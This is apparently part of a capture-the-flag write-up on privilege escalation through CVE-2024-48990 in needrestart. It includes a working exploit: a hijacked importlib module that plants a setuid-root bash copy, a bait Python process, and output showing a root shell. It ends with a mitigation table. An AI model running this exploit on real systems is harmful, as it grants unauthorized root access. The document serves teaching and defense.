Privilege escalation — CVE-2024-48990 (needrestart)
bash
sudo -l
# (???) NOPASSWD: /usr/sbin/needrestart

Verify the sudo rule's target user.
For this technique to reach root, the rule must permit running needrestart as root (for example (ALL) or (root)). A rule of the form (fismathack) NOPASSWD: /usr/sbin/needrestart would run it as fismathack and would not escalate.
Paste the exact sudo -l output into the repo.

As of 2026-11-22, per the Qualys advisory and NVD: 
CVE-2024-48990 is a local privilege escalation in needrestart before 3.8. When scanning which services need restarting, needrestart runs the Python interpreter of a running process while inheriting that process's PYTHONPATH. 
A local user can point PYTHONPATH at a directory they control, so a module the interpreter imports executes as root (CWE-427, Uncontrolled Search Path Element). Debian/Rapid7 record a CVSS v2 base score of 7.0 (AV:L/AC:L/Au:S/C:C/I:C/A:C); 
the CVSS v4 score was pending at NVD at the time of writing. The box runs 3.7, which is affected.

Pure-Python importlib hijack:
bash
# Attacker-controlled module imported by needrestart's interpreter scan
mkdir -p /tmp/malicious/importlib
cat > /tmp/malicious/importlib/__init__.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/poc && chmod 4755 /tmp/poc")
EOF

# A long-running Python process for needrestart to inspect
cat > /tmp/malicious/bait.py <<'EOF'
import time
while True:
    time.sleep(1)
EOF

cd /tmp/malicious
PYTHONPATH=/tmp/malicious python3 bait.py &
sudo needrestart

The code in importlib/__init__.py runs as root (the os.setuid(0)/os.setgid(0) calls in the original payload are redundant, since the interpreter is already root at that point). After needrestart completes its scan:

bash
ls -l /tmp/poc
# -rwsr-xr-x 1 root root ... /tmp/poc

/tmp/poc -p
whoami
# root
cat /root/root.txt
# HTB{REDACTED}

Root cause and mitigations:
Layer	Issue	Fix
Web	EXSLT extensions enabled on user-supplied XSLT (CWE-611 / unsafe lxml.etree.XSLT)	Disable extensions and network/file access via XSLTAccessControl.DENY_ALL; never process attacker-supplied stylesheets
Credentials	Unsalted MD5 password hashes in the app DB	Use a slow, salted KDF (bcrypt, scrypt, Argon2)
Sudo	NOPASSWD on a system utility that spawns interpreters	Remove the rule or scope it tightly; keep Defaults env_reset so PYTHONPATH is not inherited
Patching	needrestart 3.7 is vulnerable to CVE-2024-48990	Upgrade to needrestart ≥ 3.8 (fixed upstream in commit fcc9a44); apply the distro security update


